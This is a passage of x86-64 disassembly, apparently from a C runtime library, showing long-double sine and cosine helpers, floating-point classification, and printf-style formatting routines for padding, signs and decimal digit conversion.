  405cf4:	75 3a                	jne    0x405d30
  405cf6:	db 7c 24 60          	fstpt  0x60(%rsp)
  405cfa:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
  405cff:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
  405d04:	e8 77 01 00 00       	call   0x405e80
  405d09:	db 6c 24 70          	fldt   0x70(%rsp)
  405d0d:	dd 5c 24 58          	fstpl  0x58(%rsp)
  405d11:	dd 44 24 58          	fldl   0x58(%rsp)
  405d15:	dd 5c 24 38          	fstpl  0x38(%rsp)
  405d19:	f2 0f 10 44 24 38    	movsd  0x38(%rsp),%xmm0
  405d1f:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
  405d26:	c3                   	ret
  405d27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  405d2e:	00 00 
  405d30:	81 fa 00 00 f0 7f    	cmp    $0x7ff00000,%edx
  405d36:	75 be                	jne    0x405cf6
  405d38:	85 c0                	test   %eax,%eax
  405d3a:	dd 5c 24 40          	fstpl  0x40(%rsp)
  405d3e:	74 40                	je     0x405d80
  405d40:	e8 7b 4c 00 00       	call   0x40a9c0
  405d45:	dd 44 24 40          	fldl   0x40(%rsp)
  405d49:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
  405d4f:	48 8d 15 1a 7b 15 00 	lea    0x157b1a(%rip),%rdx        # 0x55d870
  405d56:	66 0f 57 db          	xorpd  %xmm3,%xmm3
  405d5a:	b9 01 00 00 00       	mov    $0x1,%ecx
  405d5f:	dd 54 24 20          	fstl   0x20(%rsp)
  405d63:	dd 5c 24 38          	fstpl  0x38(%rsp)
  405d67:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  405d6d:	e8 8e ee ff ff       	call   0x404c00
  405d72:	dd 44 24 40          	fldl   0x40(%rsp)
  405d76:	eb 9d                	jmp    0x405d15
  405d78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  405d7f:	00 
  405d80:	e8 3b 4c 00 00       	call   0x40a9c0
  405d85:	dd 44 24 40          	fldl   0x40(%rsp)
  405d89:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
  405d8f:	48 8d 15 da 7a 15 00 	lea    0x157ada(%rip),%rdx        # 0x55d870
  405d96:	66 0f 57 db          	xorpd  %xmm3,%xmm3
  405d9a:	48 b8 00 00 00 00 00 	movabs $0x7ff8000000000000,%rax
  405da1:	00 f8 7f 
  405da4:	dd 5c 24 38          	fstpl  0x38(%rsp)
  405da8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  405dad:	b9 01 00 00 00       	mov    $0x1,%ecx
  405db2:	f2 0f 10 54 24 38    	movsd  0x38(%rsp),%xmm2
  405db8:	e8 43 ee ff ff       	call   0x404c00
  405dbd:	dd 05 b5 7a 15 00    	fldl   0x157ab5(%rip)        # 0x55d878
  405dc3:	e9 4d ff ff ff       	jmp    0x405d15
  405dc8:	90                   	nop
  405dc9:	90                   	nop
  405dca:	90                   	nop
  405dcb:	90                   	nop
  405dcc:	90                   	nop
  405dcd:	90                   	nop
  405dce:	90                   	nop
  405dcf:	90                   	nop
  405dd0:	48 83 ec 48          	sub    $0x48,%rsp
  405dd4:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
  405dd9:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  405dde:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  405de3:	45 31 c0             	xor    %r8d,%r8d
  405de6:	49 89 d1             	mov    %rdx,%r9
  405de9:	48 89 ca             	mov    %rcx,%rdx
  405dec:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  405df1:	b9 00 60 00 00       	mov    $0x6000,%ecx
  405df6:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  405dfb:	e8 a0 16 00 00       	call   0x4074a0
  405e00:	48 83 c4 48          	add    $0x48,%rsp
  405e04:	c3                   	ret
  405e05:	90                   	nop
  405e06:	90                   	nop
  405e07:	90                   	nop
  405e08:	90                   	nop
  405e09:	90                   	nop
  405e0a:	90                   	nop
  405e0b:	90                   	nop
  405e0c:	90                   	nop
  405e0d:	90                   	nop
  405e0e:	90                   	nop
  405e0f:	90                   	nop
  405e10:	48 83 ec 38          	sub    $0x38,%rsp
  405e14:	49 89 d1             	mov    %rdx,%r9
  405e17:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
  405e1c:	48 89 ca             	mov    %rcx,%rdx
  405e1f:	45 31 c0             	xor    %r8d,%r8d
  405e22:	b9 00 60 00 00       	mov    $0x6000,%ecx
  405e27:	e8 74 16 00 00       	call   0x4074a0
  405e2c:	48 83 c4 38          	add    $0x38,%rsp
  405e30:	c3                   	ret
  405e31:	90                   	nop
  405e32:	90                   	nop
  405e33:	90                   	nop
  405e34:	90                   	nop
  405e35:	90                   	nop
  405e36:	90                   	nop
  405e37:	90                   	nop
  405e38:	90                   	nop
  405e39:	90                   	nop
  405e3a:	90                   	nop
  405e3b:	90                   	nop
  405e3c:	90                   	nop
  405e3d:	90                   	nop
  405e3e:	90                   	nop
  405e3f:	90                   	nop
  405e40:	db 2a                	fldt   (%rdx)
  405e42:	d9 fe                	fsin
  405e44:	df e0                	fnstsw %ax
  405e46:	a9 00 04 00 00       	test   $0x400,%eax
  405e4b:	75 0e                	jne    0x405e5b
  405e4d:	48 89 c8             	mov    %rcx,%rax
  405e50:	48 c7 41 08 00 00 00 	movq   $0x0,0x8(%rcx)
  405e57:	00 
  405e58:	db 39                	fstpt  (%rcx)
  405e5a:	c3                   	ret
  405e5b:	d9 eb                	fldpi
  405e5d:	d8 c0                	fadd   %st(0),%st
  405e5f:	d9 c9                	fxch   %st(1)
  405e61:	d9 f5                	fprem1
  405e63:	df e0                	fnstsw %ax
  405e65:	a9 00 04 00 00       	test   $0x400,%eax
  405e6a:	75 f5                	jne    0x405e61
  405e6c:	dd d9                	fstp   %st(1)
  405e6e:	d9 fe                	fsin
  405e70:	48 89 c8             	mov    %rcx,%rax
  405e73:	48 c7 41 08 00 00 00 	movq   $0x0,0x8(%rcx)
  405e7a:	00 
  405e7b:	db 39                	fstpt  (%rcx)
  405e7d:	c3                   	ret
  405e7e:	90                   	nop
  405e7f:	90                   	nop
  405e80:	db 2a                	fldt   (%rdx)
  405e82:	d9 ff                	fcos
  405e84:	df e0                	fnstsw %ax
  405e86:	a9 00 04 00 00       	test   $0x400,%eax
  405e8b:	74 15                	je     0x405ea2
  405e8d:	d9 eb                	fldpi
  405e8f:	d8 c0                	fadd   %st(0),%st
  405e91:	d9 c9                	fxch   %st(1)
  405e93:	d9 f5                	fprem1
  405e95:	df e0                	fnstsw %ax
  405e97:	a9 00 04 00 00       	test   $0x400,%eax
  405e9c:	75 f5                	jne    0x405e93
  405e9e:	dd d9                	fstp   %st(1)
  405ea0:	d9 ff                	fcos
  405ea2:	48 89 c8             	mov    %rcx,%rax
  405ea5:	48 c7 41 08 00 00 00 	movq   $0x0,0x8(%rcx)
  405eac:	00 
  405ead:	db 39                	fstpt  (%rcx)
  405eaf:	c3                   	ret
  405eb0:	48 83 ec 58          	sub    $0x58,%rsp
  405eb4:	49 89 d2             	mov    %rdx,%r10
  405eb7:	db 2a                	fldt   (%rdx)
  405eb9:	d9 e5                	fxam
  405ebb:	9b df e0             	fstsw  %ax
  405ebe:	dd d8                	fstp   %st(0)
  405ec0:	f6 c4 01             	test   $0x1,%ah
  405ec3:	74 1b                	je     0x405ee0
  405ec5:	f6 c4 04             	test   $0x4,%ah
  405ec8:	0f 84 82 00 00 00    	je     0x405f50
  405ece:	0f b7 42 08          	movzwl 0x8(%rdx),%eax
  405ed2:	c7 44 24 44 03 00 00 	movl   $0x3,0x44(%rsp)
  405ed9:	00 
  405eda:	31 d2                	xor    %edx,%edx
  405edc:	eb 15                	jmp    0x405ef3
  405ede:	66 90                	xchg   %ax,%ax
  405ee0:	f6 c4 04             	test   $0x4,%ah
  405ee3:	75 4f                	jne    0x405f34
  405ee5:	0f b7 42 08          	movzwl 0x8(%rdx),%eax
  405ee9:	c7 44 24 44 00 00 00 	movl   $0x0,0x44(%rsp)
  405ef0:	00 
  405ef1:	31 d2                	xor    %edx,%edx
  405ef3:	25 00 80 00 00       	and    $0x8000,%eax
  405ef8:	4c 8b 9c 24 80 00 00 	mov    0x80(%rsp),%r11
  405eff:	00 
  405f00:	41 89 03             	mov    %eax,(%r11)
  405f03:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
  405f08:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
  405f0d:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  405f11:	4c 8d 4c 24 44       	lea    0x44(%rsp),%r9
  405f16:	48 8d 0d 93 6e 15 00 	lea    0x156e93(%rip),%rcx        # 0x55cdb0
  405f1d:	44 89 44 24 28       	mov    %r8d,0x28(%rsp)
  405f22:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  405f27:	4d 89 d0             	mov    %r10,%r8
  405f2a:	e8 f1 1e 00 00       	call   0x407e20
  405f2f:	48 83 c4 58          	add    $0x58,%rsp
  405f33:	c3                   	ret
  405f34:	f6 c4 40             	test   $0x40,%ah
  405f37:	74 27                	je     0x405f60
  405f39:	0f b7 42 08          	movzwl 0x8(%rdx),%eax
  405f3d:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%rsp)
  405f44:	00 
  405f45:	ba c3 bf ff ff       	mov    $0xffffbfc3,%edx
  405f4a:	eb a7                	jmp    0x405ef3
  405f4c:	0f 1f 40 00          	nopl   0x0(%rax)
  405f50:	c7 44 24 44 04 00 00 	movl   $0x4,0x44(%rsp)
  405f57:	00 
  405f58:	31 d2                	xor    %edx,%edx
  405f5a:	31 c0                	xor    %eax,%eax
  405f5c:	eb 9a                	jmp    0x405ef8
  405f5e:	66 90                	xchg   %ax,%ax
  405f60:	0f b7 42 08          	movzwl 0x8(%rdx),%eax
  405f64:	c7 44 24 44 01 00 00 	movl   $0x1,0x44(%rsp)
  405f6b:	00 
  405f6c:	89 c2                	mov    %eax,%edx
  405f6e:	81 e2 ff 7f 00 00    	and    $0x7fff,%edx
  405f74:	81 ea 3e 40 00 00    	sub    $0x403e,%edx
  405f7a:	e9 74 ff ff ff       	jmp    0x405ef3
  405f7f:	90                   	nop
  405f80:	53                   	push   %rbx
  405f81:	48 83 ec 20          	sub    $0x20,%rsp
  405f85:	8b 42 08             	mov    0x8(%rdx),%eax
  405f88:	48 89 d3             	mov    %rdx,%rbx
  405f8b:	f6 c4 40             	test   $0x40,%ah
  405f8e:	75 08                	jne    0x405f98
  405f90:	8b 52 24             	mov    0x24(%rdx),%edx
  405f93:	39 53 28             	cmp    %edx,0x28(%rbx)
  405f96:	7e 12                	jle    0x405faa
  405f98:	f6 c4 20             	test   $0x20,%ah
  405f9b:	75 23                	jne    0x405fc0
  405f9d:	48 63 43 24          	movslq 0x24(%rbx),%rax
  405fa1:	48 8b 13             	mov    (%rbx),%rdx
  405fa4:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
  405fa7:	8b 53 24             	mov    0x24(%rbx),%edx
  405faa:	83 c2 01             	add    $0x1,%edx
  405fad:	89 53 24             	mov    %edx,0x24(%rbx)
  405fb0:	48 83 c4 20          	add    $0x20,%rsp
  405fb4:	5b                   	pop    %rbx
  405fb5:	c3                   	ret
  405fb6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  405fbd:	00 00 00 
  405fc0:	48 8b 13             	mov    (%rbx),%rdx
  405fc3:	e8 00 4a 00 00       	call   0x40a9c8
  405fc8:	8b 53 24             	mov    0x24(%rbx),%edx
  405fcb:	83 c2 01             	add    $0x1,%edx
  405fce:	89 53 24             	mov    %edx,0x24(%rbx)
  405fd1:	48 83 c4 20          	add    $0x20,%rsp
  405fd5:	5b                   	pop    %rbx
  405fd6:	c3                   	ret
  405fd7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  405fde:	00 00 
  405fe0:	41 54                	push   %r12
  405fe2:	55                   	push   %rbp
  405fe3:	57                   	push   %rdi
  405fe4:	56                   	push   %rsi
  405fe5:	53                   	push   %rbx
  405fe6:	48 83 ec 40          	sub    $0x40,%rsp
  405fea:	4c 89 c3             	mov    %r8,%rbx
  405fed:	48 89 ce             	mov    %rcx,%rsi
  405ff0:	4c 8d 44 24 2c       	lea    0x2c(%rsp),%r8
  405ff5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  405ffa:	89 d5                	mov    %edx,%ebp
  405ffc:	31 d2                	xor    %edx,%edx
  405ffe:	e8 6d 34 00 00       	call   0x409470
  406003:	8b 43 10             	mov    0x10(%rbx),%eax
  406006:	85 c0                	test   %eax,%eax
  406008:	78 05                	js     0x40600f
  40600a:	39 c5                	cmp    %eax,%ebp
  40600c:	0f 4f e8             	cmovg  %eax,%ebp
  40600f:	8b 43 0c             	mov    0xc(%rbx),%eax
  406012:	39 c5                	cmp    %eax,%ebp
  406014:	7d 7f                	jge    0x406095
  406016:	29 e8                	sub    %ebp,%eax
  406018:	85 c0                	test   %eax,%eax
  40601a:	89 43 0c             	mov    %eax,0xc(%rbx)
  40601d:	7e 06                	jle    0x406025
  40601f:	f6 43 09 04          	testb  $0x4,0x9(%rbx)
  406023:	74 7b                	je     0x4060a0
  406025:	85 ed                	test   %ebp,%ebp
  406027:	7e 54                	jle    0x40607d
  406029:	0f b7 16             	movzwl (%rsi),%edx
  40602c:	4c 8d 44 24 2c       	lea    0x2c(%rsp),%r8
  406031:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  406036:	48 83 c6 02          	add    $0x2,%rsi
  40603a:	e8 31 34 00 00       	call   0x409470
  40603f:	85 c0                	test   %eax,%eax
  406041:	7e 3a                	jle    0x40607d
  406043:	8d 40 ff             	lea    -0x1(%rax),%eax
  406046:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  40604b:	4c 8d 64 04 31       	lea    0x31(%rsp,%rax,1),%r12
  406050:	0f be 0f             	movsbl (%rdi),%ecx
  406053:	48 89 da             	mov    %rbx,%rdx
  406056:	48 83 c7 01          	add    $0x1,%rdi
  40605a:	e8 21 ff ff ff       	call   0x405f80
  40605f:	4c 39 e7             	cmp    %r12,%rdi
  406062:	75 ec                	jne    0x406050
  406064:	83 ed 01             	sub    $0x1,%ebp
  406067:	85 ed                	test   %ebp,%ebp
  406069:	7f be                	jg     0x406029
  40606b:	eb 10                	jmp    0x40607d
  40606d:	0f 1f 00             	nopl   (%rax)
  406070:	48 89 da             	mov    %rbx,%rdx
  406073:	b9 20 00 00 00       	mov    $0x20,%ecx
  406078:	e8 03 ff ff ff       	call   0x405f80
  40607d:	8b 43 0c             	mov    0xc(%rbx),%eax
  406080:	8d 50 ff             	lea    -0x1(%rax),%edx
  406083:	85 c0                	test   %eax,%eax
  406085:	89 53 0c             	mov    %edx,0xc(%rbx)
  406088:	7f e6                	jg     0x406070
  40608a:	48 83 c4 40          	add    $0x40,%rsp
  40608e:	5b                   	pop    %rbx
  40608f:	5e                   	pop    %rsi
  406090:	5f                   	pop    %rdi
  406091:	5d                   	pop    %rbp
  406092:	41 5c                	pop    %r12
  406094:	c3                   	ret
  406095:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  40609c:	eb 87                	jmp    0x406025
  40609e:	66 90                	xchg   %ax,%ax
  4060a0:	83 e8 01             	sub    $0x1,%eax
  4060a3:	89 43 0c             	mov    %eax,0xc(%rbx)
  4060a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4060ad:	00 00 00 
  4060b0:	b9 20 00 00 00       	mov    $0x20,%ecx
  4060b5:	48 89 da             	mov    %rbx,%rdx
  4060b8:	e8 c3 fe ff ff       	call   0x405f80
  4060bd:	8b 43 0c             	mov    0xc(%rbx),%eax
  4060c0:	8d 48 ff             	lea    -0x1(%rax),%ecx
  4060c3:	85 c0                	test   %eax,%eax
  4060c5:	89 4b 0c             	mov    %ecx,0xc(%rbx)
  4060c8:	75 e6                	jne    0x4060b0
  4060ca:	e9 56 ff ff ff       	jmp    0x406025
  4060cf:	90                   	nop
  4060d0:	55                   	push   %rbp
  4060d1:	57                   	push   %rdi
  4060d2:	56                   	push   %rsi
  4060d3:	53                   	push   %rbx
  4060d4:	48 83 ec 28          	sub    $0x28,%rsp
  4060d8:	41 8b 40 10          	mov    0x10(%r8),%eax
  4060dc:	48 89 ce             	mov    %rcx,%rsi
  4060df:	89 d5                	mov    %edx,%ebp
  4060e1:	4c 89 c3             	mov    %r8,%rbx
  4060e4:	85 c0                	test   %eax,%eax
  4060e6:	78 05                	js     0x4060ed
  4060e8:	39 c2                	cmp    %eax,%edx
  4060ea:	0f 4f e8             	cmovg  %eax,%ebp
  4060ed:	8b 43 0c             	mov    0xc(%rbx),%eax
  4060f0:	39 c5                	cmp    %eax,%ebp
  4060f2:	0f 8d 8c 00 00 00    	jge    0x406184
  4060f8:	29 e8                	sub    %ebp,%eax
  4060fa:	85 c0                	test   %eax,%eax
  4060fc:	89 43 0c             	mov    %eax,0xc(%rbx)
  4060ff:	7e 29                	jle    0x40612a
  406101:	f6 43 09 04          	testb  $0x4,0x9(%rbx)
  406105:	75 23                	jne    0x40612a
  406107:	83 e8 01             	sub    $0x1,%eax
  40610a:	89 43 0c             	mov    %eax,0xc(%rbx)
  40610d:	0f 1f 00             	nopl   (%rax)
  406110:	b9 20 00 00 00       	mov    $0x20,%ecx
  406115:	48 89 da             	mov    %rbx,%rdx
  406118:	e8 63 fe ff ff       	call   0x405f80
  40611d:	8b 43 0c             	mov    0xc(%rbx),%eax
  406120:	8d 48 ff             	lea    -0x1(%rax),%ecx
  406123:	85 c0                	test   %eax,%eax
  406125:	89 4b 0c             	mov    %ecx,0xc(%rbx)
  406128:	75 e6                	jne    0x406110
  40612a:	8d 45 ff             	lea    -0x1(%rbp),%eax
  40612d:	85 ed                	test   %ebp,%ebp
  40612f:	48 8d 7c 06 01       	lea    0x1(%rsi,%rax,1),%rdi
  406134:	74 38                	je     0x40616e
  406136:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40613d:	00 00 00 
  406140:	0f be 0e             	movsbl (%rsi),%ecx
  406143:	48 89 da             	mov    %rbx,%rdx
  406146:	48 83 c6 01          	add    $0x1,%rsi
  40614a:	e8 31 fe ff ff       	call   0x405f80
  40614f:	48 39 fe             	cmp    %rdi,%rsi
  406152:	75 ec                	jne    0x406140
  406154:	8b 43 0c             	mov    0xc(%rbx),%eax
  406157:	8d 50 ff             	lea    -0x1(%rax),%edx
  40615a:	85 c0                	test   %eax,%eax
  40615c:	89 53 0c             	mov    %edx,0xc(%rbx)
  40615f:	7e 1a                	jle    0x40617b
  406161:	48 89 da             	mov    %rbx,%rdx
  406164:	b9 20 00 00 00       	mov    $0x20,%ecx
  406169:	e8 12 fe ff ff       	call   0x405f80
  40616e:	8b 43 0c             	mov    0xc(%rbx),%eax
  406171:	8d 50 ff             	lea    -0x1(%rax),%edx
  406174:	85 c0                	test   %eax,%eax
  406176:	89 53 0c             	mov    %edx,0xc(%rbx)
  406179:	7f e6                	jg     0x406161
  40617b:	48 83 c4 28          	add    $0x28,%rsp
  40617f:	5b                   	pop    %rbx
  406180:	5e                   	pop    %rsi
  406181:	5f                   	pop    %rdi
  406182:	5d                   	pop    %rbp
  406183:	c3                   	ret
  406184:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  40618b:	eb 9d                	jmp    0x40612a
  40618d:	0f 1f 00             	nopl   (%rax)
  406190:	48 83 ec 38          	sub    $0x38,%rsp
  406194:	85 c9                	test   %ecx,%ecx
  406196:	41 c7 40 10 ff ff ff 	movl   $0xffffffff,0x10(%r8)
  40619d:	ff 
  40619e:	74 44                	je     0x4061e4
  4061a0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4061a5:	45 8b 58 08          	mov    0x8(%r8),%r11d
  4061a9:	c6 44 24 20 2d       	movb   $0x2d,0x20(%rsp)
  4061ae:	4c 8d 51 01          	lea    0x1(%rcx),%r10
  4061b2:	41 83 e3 20          	and    $0x20,%r11d
  4061b6:	45 31 c9             	xor    %r9d,%r9d
  4061b9:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
  4061be:	83 e0 df             	and    $0xffffffdf,%eax
  4061c1:	44 09 d8             	or     %r11d,%eax
  4061c4:	43 88 04 0a          	mov    %al,(%r10,%r9,1)
  4061c8:	49 83 c1 01          	add    $0x1,%r9
  4061cc:	49 83 f9 03          	cmp    $0x3,%r9
  4061d0:	75 e7                	jne    0x4061b9
  4061d2:	49 8d 52 03          	lea    0x3(%r10),%rdx
  4061d6:	48 29 ca             	sub    %rcx,%rdx
  4061d9:	e8 f2 fe ff ff       	call   0x4060d0
  4061de:	90                   	nop
  4061df:	48 83 c4 38          	add    $0x38,%rsp
  4061e3:	c3                   	ret
  4061e4:	45 8b 58 08          	mov    0x8(%r8),%r11d
  4061e8:	41 f7 c3 00 01 00 00 	test   $0x100,%r11d
  4061ef:	74 10                	je     0x406201
  4061f1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4061f6:	c6 44 24 20 2b       	movb   $0x2b,0x20(%rsp)
  4061fb:	4c 8d 51 01          	lea    0x1(%rcx),%r10
  4061ff:	eb b1                	jmp    0x4061b2
  406201:	41 f6 c3 40          	test   $0x40,%r11b
  406205:	74 19                	je     0x406220
  406207:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  40620c:	c6 44 24 20 20       	movb   $0x20,0x20(%rsp)
  406211:	4c 8d 51 01          	lea    0x1(%rcx),%r10
  406215:	eb 9b                	jmp    0x4061b2
  406217:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40621e:	00 00 
  406220:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  406225:	49 89 ca             	mov    %rcx,%r10
  406228:	eb 88                	jmp    0x4061b2
  40622a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  406230:	55                   	push   %rbp
  406231:	48 89 e5             	mov    %rsp,%rbp
  406234:	57                   	push   %rdi
  406235:	56                   	push   %rsi
  406236:	53                   	push   %rbx
  406237:	48 83 ec 28          	sub    $0x28,%rsp
  40623b:	44 8b 42 10          	mov    0x10(%rdx),%r8d
  40623f:	44 8b 52 08          	mov    0x8(%rdx),%r10d
  406243:	31 c0                	xor    %eax,%eax
  406245:	48 89 d6             	mov    %rdx,%rsi
  406248:	49 89 cb             	mov    %rcx,%r11
  40624b:	45 85 c0             	test   %r8d,%r8d
  40624e:	41 0f 49 c0          	cmovns %r8d,%eax
  406252:	41 f7 c2 00 10 00 00 	test   $0x1000,%r10d
  406259:	44 8d 48 17          	lea    0x17(%rax),%r9d
  40625d:	74 0b                	je     0x40626a
  40625f:	66 83 7a 20 00       	cmpw   $0x0,0x20(%rdx)
  406264:	0f 85 e6 01 00 00    	jne    0x406450
  40626a:	8b 46 0c             	mov    0xc(%rsi),%eax
  40626d:	41 39 c1             	cmp    %eax,%r9d
  406270:	41 0f 4d c1          	cmovge %r9d,%eax
  406274:	48 98                	cltq
  406276:	48 83 c0 0f          	add    $0xf,%rax
  40627a:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  40627e:	e8 ed f8 ff ff       	call   0x405b70
  406283:	48 29 c4             	sub    %rax,%rsp
  406286:	41 f6 c2 80          	test   $0x80,%r10b
  40628a:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
  40628f:	74 11                	je     0x4062a2
  406291:	48 85 c9             	test   %rcx,%rcx
  406294:	0f 88 36 02 00 00    	js     0x4064d0
  40629a:	41 80 e2 7f          	and    $0x7f,%r10b
  40629e:	44 89 56 08          	mov    %r10d,0x8(%rsi)
  4062a2:	4d 85 db             	test   %r11,%r11
  4062a5:	4c 89 d9             	mov    %r11,%rcx
  4062a8:	0f 84 49 02 00 00    	je     0x4064f7
  4062ae:	49 89 f8             	mov    %rdi,%r8
  4062b1:	49 b9 cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r9
  4062b8:	cc cc cc 
  4062bb:	eb 46                	jmp    0x406303
  4062bd:	0f 1f 00             	nopl   (%rax)
  4062c0:	48 39 df             	cmp    %rbx,%rdi
  4062c3:	0f 84 5b 01 00 00    	je     0x406424
  4062c9:	f6 46 09 10          	testb  $0x10,0x9(%rsi)
  4062cd:	74 31                	je     0x406300
  4062cf:	66 83 7e 20 00       	cmpw   $0x0,0x20(%rsi)
  4062d4:	74 2a                	je     0x406300
  4062d6:	48 89 d8             	mov    %rbx,%rax
  4062d9:	48 29 f8             	sub    %rdi,%rax
  4062dc:	48 89 c2             	mov    %rax,%rdx
  4062df:	48 c1 fa 3f          	sar    $0x3f,%rdx
  4062e3:	48 c1 ea 3e          	shr    $0x3e,%rdx
  4062e7:	48 01 d0             	add    %rdx,%rax
  4062ea:	83 e0 03             	and    $0x3,%eax
  4062ed:	48 29 d0             	sub    %rdx,%rax
  4062f0:	48 83 f8 03          	cmp    $0x3,%rax
  4062f4:	0f 84 36 01 00 00    	je     0x406430
  4062fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  406300:	49 89 d8             	mov    %rbx,%r8
  406303:	48 89 c8             	mov    %rcx,%rax
  406306:	49 8d 58 01          	lea    0x1(%r8),%rbx
  40630a:	49 f7 e1             	mul    %r9
  40630d:	48 c1 ea 03          	shr    $0x3,%rdx
  406311:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  406315:	48 01 c0             	add    %rax,%rax
  406318:	48 29 c1             	sub    %rax,%rcx
  40631b:	83 c1 30             	add    $0x30,%ecx
  40631e:	48 85 d2             	test   %rdx,%rdx
  406321:	41 88 08             	mov    %cl,(%r8)
  406324:	48 89 d1             	mov    %rdx,%rcx
  406327:	75 97                	jne    0x4062c0
  406329:	44 8b 46 10          	mov    0x10(%rsi),%r8d
  40632d:	45 85 c0             	test   %r8d,%r8d
  406330:	7e 2f                	jle    0x406361
  406332:	48 89 f8             	mov    %rdi,%rax
  406335:	48 29 d8             	sub    %rbx,%rax
  406338:	41 01 c0             	add    %eax,%r8d
  40633b:	45 85 c0             	test   %r8d,%r8d
  40633e:	7e 21                	jle    0x406361
  406340:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
  406344:	48 89 d8             	mov    %rbx,%rax
  406347:	48 8d 54 0b 01       	lea    0x1(%rbx,%rcx,1),%rdx
  40634c:	0f 1f 40 00          	nopl   0x0(%rax)
  406350:	c6 00 30             	movb   $0x30,(%rax)
  406353:	48 83 c0 01          	add    $0x1,%rax
  406357:	48 39 d0             	cmp    %rdx,%rax
  40635a:	75 f4                	jne    0x406350
  40635c:	48 8d 5c 0b 01       	lea    0x1(%rbx,%rcx,1),%rbx
  406361:	48 39 fb             	cmp    %rdi,%rbx
  406364:	0f 84 76 01 00 00    	je     0x4064e0
  40636a:	8b 46 0c             	mov    0xc(%rsi),%eax
  40636d:	85 c0                	test   %eax,%eax
  40636f:	7e 59                	jle    0x4063ca
  406371:	48 89 fa             	mov    %rdi,%rdx
  406374:	48 29 da             	sub    %rbx,%rdx
  406377:	01 c2                	add    %eax,%edx
  406379:	8b 46 08             	mov    0x8(%rsi),%eax
  40637c:	85 d2                	test   %edx,%edx
  40637e:	89 56 0c             	mov    %edx,0xc(%rsi)
  406381:	7e 4a                	jle    0x4063cd
  406383:	a9 c0 01 00 00       	test   $0x1c0,%eax
  406388:	74 06                	je     0x406390
  40638a:	83 ea 01             	sub    $0x1,%edx
  40638d:	89 56 0c             	mov    %edx,0xc(%rsi)
  406390:	8b 56 10             	mov    0x10(%rsi),%edx
  406393:	85 d2                	test   %edx,%edx
  406395:	0f 88 e9 00 00 00    	js     0x406484
  40639b:	f6 c4 04             	test   $0x4,%ah
  40639e:	75 2d                	jne    0x4063cd
  4063a0:	8b 56 0c             	mov    0xc(%rsi),%edx
  4063a3:	8d 4a ff             	lea    -0x1(%rdx),%ecx
  4063a6:	85 d2                	test   %edx,%edx
  4063a8:	89 4e 0c             	mov    %ecx,0xc(%rsi)
  4063ab:	7e 20                	jle    0x4063cd
  4063ad:	0f 1f 00             	nopl   (%rax)
  4063b0:	48 89 f2             	mov    %rsi,%rdx
  4063b3:	b9 20 00 00 00       	mov    $0x20,%ecx
  4063b8:	e8 c3 fb ff ff       	call   0x405f80
  4063bd:	8b 46 0c             	mov    0xc(%rsi),%eax
  4063c0:	8d 50 ff             	lea    -0x1(%rax),%edx
  4063c3:	85 c0                	test   %eax,%eax
  4063c5:	89 56 0c             	mov    %edx,0xc(%rsi)
  4063c8:	7f e6                	jg     0x4063b0
  4063ca:	8b 46 08             	mov    0x8(%rsi),%eax
  4063cd:	a8 80                	test   $0x80,%al
  4063cf:	74 6f                	je     0x406440
  4063d1:	c6 03 2d             	movb   $0x2d,(%rbx)
  4063d4:	48 83 c3 01          	add    $0x1,%rbx
  4063d8:	48 39 df             	cmp    %rbx,%rdi
  4063db:	73 31                	jae    0x40640e
  4063dd:	0f 1f 00             	nopl   (%rax)
  4063e0:	48 83 eb 01          	sub    $0x1,%rbx
  4063e4:	48 89 f2             	mov    %rsi,%rdx
  4063e7:	0f be 0b             	movsbl (%rbx),%ecx
  4063ea:	e8 91 fb ff ff       	call   0x405f80
  4063ef:	48 39 fb             	cmp    %rdi,%rbx
  4063f2:	75 ec                	jne    0x4063e0
  4063f4:	8b 46 0c             	mov    0xc(%rsi),%eax
  4063f7:	8d 50 ff             	lea    -0x1(%rax),%edx
  4063fa:	85 c0                	test   %eax,%eax
  4063fc:	89 56 0c             	mov    %edx,0xc(%rsi)
  4063ff:	7e 1a                	jle    0x40641b
